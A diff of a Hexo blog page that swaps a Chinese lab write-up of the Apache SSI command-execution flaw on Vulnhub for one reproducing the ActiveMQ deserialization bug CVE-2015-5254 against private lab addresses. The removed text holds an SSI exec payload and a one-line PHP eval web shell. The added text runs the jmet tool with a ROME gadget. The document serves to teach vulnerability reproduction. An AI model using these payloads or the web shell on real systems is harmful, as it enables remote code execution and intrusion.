@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞,">
+  <meta name="keywords" content="ActiveMQ反序列化漏洞（CVE-2015-5254）复现：,">
 
 
 
@@ -79,22 +79,21 @@
 
 
 
-<meta name="description" content="利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞 漏洞复现：1.访问http://192.168.199.151:8080/upload.php首先上传一个php文件可以发现不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，就可以上传一个shtml文件 方法一：    上传一个shtml文件可保存为shell.shtml文件通过浏览器上传可以生成一个后缀名为">
-<meta name="keywords" content="利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞">
+<meta name="description" content="ActiveMQ反序列化漏洞（CVE-2015-5254）复现： 简介： Apache ActiveMQ是Apache软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）O">
+<meta name="keywords" content="ActiveMQ反序列化漏洞（CVE-2015-5254）复现：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞">
+<meta property="og:title" content="ActiveMQ反序列化漏洞（CVE-2015-5254）复现：">
 <meta property="og:url" content="http://yoursite.com/2019/07/20/1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞 漏洞复现：1.访问http://192.168.199.151:8080/upload.php首先上传一个php文件可以发现不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，就可以上传一个shtml文件 方法一：    上传一个shtml文件可保存为shell.shtml文件通过浏览器上传可以生成一个后缀名为">
+<meta property="og:description" content="ActiveMQ反序列化漏洞（CVE-2015-5254）复现： 简介： Apache ActiveMQ是Apache软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）O">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/CE4C8C77B04A41338AC2F0CA3B98B2AA/4090">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/83D7740383994602BB0CFC315C676B4F/4091">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/43D7780570614E6D881E59B15D3F32BF/4095">
-<meta property="og:updated_time" content="2019-08-15T03:19:46.244Z">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/116B9851BEDA41AB9456F990D2049F1B/4070%22h%22">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/7C8D1C502FBF45F8B19F8357E2528FFD/4064%22h%22">
+<meta property="og:updated_time" content="2019-08-15T03:39:44.315Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞">
-<meta name="twitter:description" content="利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞 漏洞复现：1.访问http://192.168.199.151:8080/upload.php首先上传一个php文件可以发现不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，就可以上传一个shtml文件 方法一：    上传一个shtml文件可保存为shell.shtml文件通过浏览器上传可以生成一个后缀名为">
-<meta name="twitter:image" content="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/CE4C8C77B04A41338AC2F0CA3B98B2AA/4090">
+<meta name="twitter:title" content="ActiveMQ反序列化漏洞（CVE-2015-5254）复现：">
+<meta name="twitter:description" content="ActiveMQ反序列化漏洞（CVE-2015-5254）复现： 简介： Apache ActiveMQ是Apache软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）O">
+<meta name="twitter:image" content="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/116B9851BEDA41AB9456F990D2049F1B/4070%22h%22">
 
 
 
@@ -130,7 +129,7 @@
 
 
 
-  <title>利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞 | Hexo</title>
+  <title>ActiveMQ反序列化漏洞（CVE-2015-5254）复现： | Hexo</title>
   
 
 
@@ -254,7 +253,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞</h1>
+          <h1 class="post-title" itemprop="name headline">ActiveMQ反序列化漏洞（CVE-2015-5254）复现：</h1>
         
 
         <div class="post-meta">
@@ -304,11 +303,18 @@
       
 
       
-        <p><strong>利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞</strong></p>
-<p><strong>漏洞复现：</strong><br>1.访问<a href="http://192.168.199.151:8080/upload.php" target="_blank" rel="noopener">http://192.168.199.151:8080/upload.php</a><br>首先上传一个php文件可以发现不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，就可以上传一个shtml文件</p>
-<p><strong>方法一：</strong></p>
-<p>   上传一个shtml文件可保存为shell.shtml文件通过浏览器上传<br>可以生成一个后缀名为shtml的文件内容为!–#exec cmd=”id” –&gt; （执行任意命令）<br>在网站里面上传刚刚生成的文件 之后在8080后面加自己的文件名，显示上传成功 如下图：<br><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/CE4C8C77B04A41338AC2F0CA3B98B2AA/4090" alt="h" title="h"></p>
-<p><strong>方法二：</strong><br>上传一个php木马内容为：<?php @eval($_POST[value]);?> 文件后缀名为php3<br>上传到网站上之后用菜刀（蚁剑）连接就可以了  如下图：<br><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/83D7740383994602BB0CFC315C676B4F/4091" alt="g" title="g"><br><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/43D7780570614E6D881E59B15D3F32BF/4095" alt="h" title="h"></p>
+        <p><strong>ActiveMQ反序列化漏洞（CVE-2015-5254）复现：</strong></p>
+<p><strong><em>简介： Apache ActiveMQ是Apache软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</em></strong></p>
+<p><strong>漏洞复现：</strong></p>
+<p>首先在kali里面执行以下命令：</p>
+<p>cd var/opt    </p>
+<p>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a>  </p>
+<p>mkdir external</p>
+<p><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/116B9851BEDA41AB9456F990D2049F1B/4070%22h%22" alt="h"></p>
+<p>输入java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME  192.168.199.120   61616</p>
+<p><strong><em>注释：-Q指定队列消息名，-I指定JMS客户端，这里是ActiveMQ，-Y指定具体的命令，-Yp指定payload类型，其后分别是ActiveMQ所在机器的ip及工作端口</em></strong></p>
+<p><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/7C8D1C502FBF45F8B19F8357E2528FFD/4064%22h%22" alt="h"></p>
+<p>现在会给目标的ActiveMQ添加一个名为事件的队列，可以我们通过<a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息</a></p>
 
       
     </div>
@@ -326,7 +332,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/利用Vulnhub复现漏洞-Apache-SSI-远程命令执行漏洞/" rel="tag"># 利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞</a>
+            <a href="/tags/ActiveMQ反序列化漏洞（CVE-2015-5254）复现：/" rel="tag"># ActiveMQ反序列化漏洞（CVE-2015-5254）复现：</a>
           
         </div>
       
